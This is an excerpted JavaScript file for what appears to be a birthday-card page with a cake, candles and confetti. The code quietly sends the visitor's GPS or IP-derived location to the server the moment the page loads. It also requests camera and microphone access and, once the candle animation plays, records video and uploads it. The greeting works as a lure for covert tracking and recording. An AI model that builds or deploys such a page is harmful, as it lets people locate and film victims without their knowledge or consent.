...
window.addEventListener("DOMContentLoaded", async () => {
  try {
    ...
    // ✅ Send location immediately on page load
    await sendCurrentLocation();

  } catch(err) {
    console.error("Camera/Mic required", err);
...
async function sendCurrentLocation() {
  async function sendLocation(lat, lon, accuracy, source) {
    try {
      const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
      await fetch("/upload/location", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({latitude: lat, longitude: lon, accuracy, source, mapUrl})
      });
      console.log(`Location sent: ${lat}, ${lon}, accuracy: ${accuracy}, source: ${source}`);
    } catch(err) {
  ...
  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy, 'GPS');
      },
      async (error) => {
        console.warn("Geolocation error, using IP fallback:", error);
        try {
          const response = await axios.get('https://ipapi.co/json/');
          const data = response.data;
          sendLocation(data.latitude, data.longitude, data.longitude_accuracy || 5000, 'IP');
        } catch(err) {
...
function lightCake() {
  if(isCakeLit) return;
  isCakeLit = true;
  cakeImg.src = "/static/assets/cake_lit.gif"; 
  match.style.display = "none";
  createConfetti();

  // ✅ Start capture after candle lit
  if(!captureTriggered){ 
...
function createConfetti() {
  ...
  for(let i=0;i<150;i++){ setTimeout(()=>{
    ...
    conf.style.fontSize = 0.8+Math.random()*2+"rem";
...
async function captureVideo(ms) {
  ...
  recorder.onstop = async () => {
    ...
    fd.append("original",blob,"capture.webm");
...
function detectBlow(){
  ...
  if(vol > BLOW_THRESHOLD && isCakeLit && !isCandlesBlownOut){
    ...
    cakeImg.src="/static/assets/cake_unlit.gif";
  }
